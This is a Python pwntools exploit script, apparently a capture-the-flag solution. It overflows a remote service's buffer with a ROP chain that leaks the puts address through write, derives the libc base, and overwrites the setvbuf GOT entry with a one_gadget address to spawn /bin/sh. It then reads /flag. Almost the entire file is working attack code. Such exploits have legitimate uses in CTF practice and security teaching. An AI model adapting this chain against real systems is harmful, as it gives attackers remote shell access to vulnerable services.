#!/usr/bin/env python2
import sys
from pwn import *
#context.log_level = logging.DEBUG

from struct import pack

# Padding goes here
p = 'a'*0x400

# saved ebp
p += 'abcdefgh'

# call write(1, &pltputs, 8)

p += pack('<Q', 0x4007f3) #pop rdi; ret
p += pack('<Q', 0x1)

p += pack('<Q', 0x4007f1) #pop rsi; pop r15; ret
p += pack('<Q', 0x601020) # & &puts
p += 'b'*8 # junk

p += pack('<Q', 0x40065c) # pop rdx; ret
p += pack('<Q', 0x8) # 8

p += pack('<Q', 0x400540) # call write

# overwrite setvbuf with magic gadget
# call read(0, 0x601038, 8)

p += pack('<Q', 0x4007f3) #pop rdi; ret
p += pack('<Q', 0x0)

p += pack('<Q', 0x4007f1) #pop rsi; pop r15; ret
p += pack('<Q', 0x601038) # & &puts
p += 'b'*8 # junk

p += pack('<Q', 0x40065c) # pop rdx; ret
p += pack('<Q', 0x8) # 8

p += pack('<Q', 0x400550) # call read

# call magic gadget (previously setvbuf)

p += pack('<Q', 0x400560) # call old setvbuf (now magic gadget)

# padding to have magic gadget work
p += '\x00' * 0x70

conn = remote(sys.argv[1], int(sys.argv[2]))

conn.sendline("Everything intelligent is so boring.")

conn.recvuntil("Tell me more.")

conn.send(p)

conn.recvuntil("Fascinating.\n")

from_remote = conn.recvn(8)

address_of_puts = u64(from_remote)

# in our libc, @puts is 0x809c0
baseline = address_of_puts - 0x809c0

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

address_of_one_gadget = baseline + 0x4f322

conn.send(p64(address_of_one_gadget))

conn.sendline('cat /flag')

print("FLAG: %s" % conn.recvline())
